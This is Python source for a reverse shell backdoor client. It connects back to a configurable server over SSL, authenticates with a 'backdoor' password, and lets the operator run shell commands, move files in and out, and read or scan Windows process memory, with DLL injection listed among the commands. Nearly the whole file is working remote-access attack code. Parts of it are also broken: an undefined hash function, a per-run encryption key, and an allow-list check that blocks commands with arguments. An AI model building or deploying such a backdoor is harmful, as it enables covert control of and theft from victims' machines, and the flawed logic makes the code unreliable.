import socket
import json
import subprocess
import os
import sys
import ssl
import logging
import threading
from cryptography.fernet import Fernet
import hashlib
import os
from queue import Queue
import time  # Added import for time module
import platform # To check OS

# Attempt to import Windows-specific utilities
IS_WINDOWS = platform.system() == "Windows"
if IS_WINDOWS:
    try:
        import windows_utils
    except ImportError:
        print("Warning: Failed to import windows_utils. Windows-specific commands will not be available.")
        IS_WINDOWS = False # Treat as non-Windows if import fails

# Load environment variables
import os

SERVER_IP = os.getenv("SERVER_IP", "127.0.0.1")  # Default to localhost for testing
SERVER_PORT = int(os.getenv("SERVER_PORT", 5555))  # Default port
PASSWORD = os.getenv("BACKDOOR_PASSWORD", "your_secure_password")  # Use environment variable

# Configure logging
logging.basicConfig(filename='reverse_shell.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Encryption
ENCRYPTION_KEY = Fernet.generate_key()  # Save this securely
cipher = Fernet(ENCRYPTION_KEY)

BUFFER_SIZE = 4096
ALLOWED_COMMANDS = {
    'ls', 'pwd', 'cd', 'upload', 'download', 'clear', 'quit', 'help',
    'analyze_strings', 'get_file_hash',
    # Windows specific commands are added conditionally below
}
if IS_WINDOWS:
    ALLOWED_COMMANDS.update({
        'list_processes_win',
        'proc_details_win',
        'read_mem_win',
        'scan_mem_win',
        'inject_dll_win'
    })
command_history = []

def get_file_hash(filepath, hashtype='sha256'):
    """Generate hash of a file (md5, sha1, sha256)."""
    hasher = None
    if hashtype == 'md5':
        hasher = hashlib.md5()
    elif hashtype == 'sha1':
        hasher = hashlib.sha1()
    elif hashtype == 'sha256':
        hasher = hashlib.sha256()
    else:
        return "Unsupported hash type. Use md5, sha1, or sha256."

    try:
        with open(filepath, 'rb') as f:
            while chunk := f.read(8192):
                hasher.update(chunk)
        return hasher.hexdigest()
    except FileNotFoundError:
        return f"Error: File not found at {filepath}"
    except Exception as e:
        return f"Error hashing file: {e}"

def extract_strings(filepath, min_len=4):
    """Extract printable strings from a file."""
    strings = []
    try:
        with open(filepath, "rb") as f:
            data = f.read()
        current_string = ""
        for byte in data:
            if 32 <= byte <= 126:  # Printable ASCII characters
                current_string += chr(byte)
            else:
                if len(current_string) >= min_len:
                    strings.append(current_string)
                current_string = ""
        if len(current_string) >= min_len: # Check for remaining string at EOF
            strings.append(current_string)
        return strings if strings else "No printable strings found."
    except FileNotFoundError:
        return f"Error: File not found at {filepath}"
    except Exception as e:
        return f"Error extracting strings: {e}"

def reliable_send(data):
    """Send encrypted data to the server."""
    try:
        json_data = json.dumps(data)
        encrypted_data = cipher.encrypt(json_data.encode())
        target_sock.send(encrypted_data)
    except Exception as e:
        logging.error(f"Error sending data: {e}")

def reliable_recv():
    """Receive encrypted data from the server."""
    data = b''
    while True:
        try:
            packet = target_sock.recv(BUFFER_SIZE)
            if not packet:
                break
            data += packet
            decrypted_data = cipher.decrypt(data)
            return json.loads(decrypted_data.decode('utf-8'))
        except json.JSONDecodeError:
            continue
        except Exception as e:
            logging.error(f"Error receiving data: {e}")
            break

def authenticate():
    """Authenticate the session before any commands are executed."""
    try:
        attempt = reliable_recv()
        if attempt != PASSWORD:
            reliable_send("Authentication Failed")
            logging.warning("Authentication failed. Closing connection.")
            target_sock.close()
            sys.exit()
        else:
            reliable_send("Authentication Successful")
            logging.info("Authentication successful.")
    except Exception as e:
        logging.error(f"Authentication error: {e}")
        sys.exit(1)

def add_to_history(command):
    """Add executed command to history."""
    command_history.append(command)
    if len(command_history) > 100:  # Limit history length
        command_history.pop(0)

def clear_history():
    """Clear the command history."""
    command_history.clear()
    reliable_send("Command history cleared.")
    logging.info("Command history cleared.")

def list_history():
    """List the executed command history."""
    return command_history if command_history else "No commands have been executed yet."

def execute_command(command):
    """Execute a command and return its output."""
    if command not in ALLOWED_COMMANDS:
        response = f"Command '{command}' is not allowed."
        reliable_send(response)
        return

    if command.startswith('cd '):
        try:
            os.chdir(command[3:])
            response = f"Changed directory to {command[3:]}"
            add_to_history(command)
            reliable_send(response)
        except FileNotFoundError as e:
            reliable_send(f"cd error: {e}")
        return

    if command.startswith("upload "):
        upload_file(command[7:])
        return
    elif command.startswith("download "):
        download_file(command[9:])
        return
    elif command.startswith("analyze_strings "):
        filepath = command[16:].strip()
        strings_result = extract_strings(filepath)
        if isinstance(strings_result, list):
            reliable_send("\n".join(strings_result))
        else:
            reliable_send(strings_result) # Send error message
        add_to_history(command)
        return
    elif command.startswith("get_file_hash "):
        parts = command.split()
        filepath = parts[1]
        hashtype = parts[2] if len(parts) > 2 else 'sha256'
        hash_result = get_file_hash(filepath, hashtype)
        reliable_send(hash_result)
        add_to_history(command)
        return
    elif command == "list_processes_win":
        if IS_WINDOWS:
            result = windows_utils.list_processes_windows_impl()
            if isinstance(result, str): # Error message
                reliable_send(result)
            else: # List of process dicts
                # Format the list of dicts into a readable string
                output_str = "PID\tParentPID\tExeFile\n" + "-"*40 + "\n"
                for p in result:
                    output_str += f"{p['PID']}\t{p['ParentPID']}\t\t{p['ExeFile']}\n"
                reliable_send(output_str)
        else:
            reliable_send("Error: This command is only available on Windows.")
        add_to_history(command)
        return
    elif command.startswith("proc_details_win "):
        if IS_WINDOWS:
            pid_str = command[17:].strip()
            result = windows_utils.get_process_details_windows_impl(pid_str)
            if isinstance(result, str): # Error message
                reliable_send(result)
            else: # Dictionary of details
                output_str = f"Details for PID {result.get('PID', 'N/A')}:\n"
                for key, value in result.items():
                    if key != "PID": # Already in header
                        output_str += f"  {key}: {value}\n"
                reliable_send(output_str)
        else:
            reliable_send("Error: This command is only available on Windows.")
        add_to_history(command)
        return
    elif command.startswith("read_mem_win "):
        if IS_WINDOWS:
            parts = command.split()
            if len(parts) == 4:
                pid_str, addr_str, size_str = parts[1], parts[2], parts[3]
                result = windows_utils.read_process_memory_windows_impl(pid_str, addr_str, size_str)
                if isinstance(result, str): # Error message
                    reliable_send(result)
                else: # Dictionary of mem data
                    output_str = f"Memory Read from PID {result['pid']} at {result['address']}:\n"
                    output_str += f"  Requested: {result['size_requested']} bytes, Read: {result['bytes_read']} bytes\n"
                    output_str += f"  Data (hex): {result['data_hex']}"
                    reliable_send(output_str)
            else:
                reliable_send("Usage: read_mem_win [PID] [hex_address] [size_in_bytes]")
        else:
            reliable_send("Error: This command is only available on Windows.")
        add_to_history(command)
        return
    elif command.startswith("scan_mem_win "):
        if IS_WINDOWS:
            parts = command.split(maxsplit=3) # scan_mem_win [PID] [type] [pattern]
            if len(parts) == 4:
                pid_str, type_str, pattern_str = parts[1], parts[2], parts[3]
                result = windows_utils.scan_process_memory_windows_impl(pid_str, type_str, pattern_str)
                if isinstance(result, str): # Error message
                    reliable_send(result)
                else: # Dictionary of scan results
                    output_str = f"Memory Scan Results for PID {result['pid']} (Pattern: '{result['pattern']}', Type: {result['pattern_type']}):\n"
                    if result['found_at_addresses']:
                        output_str += "  Found at addresses:\n"
                        for addr in result['found_at_addresses']:
                            output_str += f"    - {addr}\n"
                    else: # Should be covered by the "not found" message from impl, but as a fallback
                        output_str += "  Pattern not found."
                    reliable_send(output_str)
            else:
                reliable_send("Usage: scan_mem_win [PID] [string|bytes] [pattern_to_search (hex for bytes)]")
        else:
            reliable_send("Error: This command is only available on Windows.")
        add_to_history(command)
        return
    elif command == "history":
        response = list_history()
        reliable_send("\n".join(response))
        return
    elif command == "clear_history":
        clear_history()
        return
    else:
        try:
            # Ensure only allowed commands are executed via subprocess for security
            if command.split()[0] in ALLOWED_COMMANDS and command.split()[0] not in ['cd', 'upload', 'download', 'analyze_strings', 'get_file_hash', 'history', 'clear_history', 'help', 'quit']:
                 output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
            elif command.split()[0] not in ALLOWED_COMMANDS:
                 output = f"Command '{command.split()[0]}' is not an allowed command.".encode()
            else: # Command is handled by other functions or is not a subprocess command
                # This case should ideally not be reached if all commands are handled above
                output = f"Command '{command}' handled elsewhere or invalid.".encode()
                reliable_send(output.decode())
                return
            reliable_send(output.decode())
            add_to_history(command)
            logging.info(f"Executed command: {command}")
        except subprocess.CalledProcessError as e:
            logging.error(f"Command execution error: {e}")

def upload_file(filename):
    """Upload a file to the server."""
    try:
        with open(filename, 'rb') as file:
            data = file.read()
            reliable_send({"filename": filename, "data": data, "hash": hash_file(filename)})
        logging.info(f"Uploaded file: {filename}")
    except Exception as e:
        logging.error(f"Error uploading file {filename}: {e}")

def download_file(filename):
    """Download a file from the server."""
    try:
        response = reliable_recv()
        with open(filename, 'wb') as file:
            file.write(response["data"])
        logging.info(f"Downloaded file: {filename}")
    except Exception as e:
        logging.error(f"Error downloading file {filename}: {e}")

def display_help():
    """Provide a list of available commands."""
    help_text = """
    Available commands:
    cd [directory]: Change directory
    upload [file]: Upload a file to the server
    download [file]: Download a file from the server
    analyze_strings [filepath]: Extract printable strings from a file
    get_file_hash [filepath] [md5|sha1|sha256]: Get hash of a file (default sha256)
    clear: Clear the shell
    quit: Exit the shell
    help: Display this help information
    history: List executed commands
    clear_history: Clear command history
    """
    if IS_WINDOWS:
        help_text += """
    Windows Specific Commands:
    list_processes_win: List running processes on the Windows host.
    proc_details_win [PID]: Get details for a specific process ID on Windows.
    read_mem_win [PID] [hex_address] [size]: Read memory from a process at a given hex address.
    scan_mem_win [PID] [string|bytes] [pattern]: Scan process memory for a string or hex byte pattern.
    inject_dll_win [PID] [DLL_PATH]: Inject a DLL into a target process on Windows.
    """
    reliable_send(help_text)

def establish_connection():
    """Establish connection with the server and handle commands."""
    while True:
        try:
            target_sock.connect((SERVER_IP, SERVER_PORT))
            authenticate()
            logging.info("Connection established with server.")
            while True:
                command = reliable_recv()
                if command == 'quit':
                    logging.info("Shell terminated by server command.")
                    break
                elif command == 'help':
                    display_help()
                else:
                    execute_command(command)
        except Exception as e:
            logging.error(f"Connection error: {e}")
            time.sleep(5)  # Wait before retrying

# SSL Configuration
try:
    context = ssl.create_default_context()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        target_sock = context.wrap_socket(sock, server_hostname=SERVER_IP)
        establish_connection()
except Exception as e:
    logging.error(f"SSL Connection error: {e}")
    sys.exit(1)
